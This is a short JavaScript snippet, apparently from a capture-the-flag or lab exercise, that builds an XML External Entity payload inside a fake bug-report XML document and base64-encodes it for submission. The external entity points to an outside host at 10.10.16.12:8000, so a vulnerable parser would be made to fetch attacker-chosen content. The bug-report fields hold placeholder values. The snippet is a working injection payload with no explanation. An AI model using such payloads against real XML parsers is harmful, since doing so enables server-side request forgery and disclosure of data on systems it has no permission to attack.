const xml = '<?xml  version="1.0" encoding="ISO-8859-1"?>' + 
'<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.12:8000/nmap"> ]>'
+'		<bugreport>'
+'		<title>&xxe;</title>i'
+'		<cwe>qsdqs</cwe>'
+'		<cvss>200</cvss>'
+'		<reward>100000</reward>'
+'		</bugreport>'

console.log(btoa(xml))
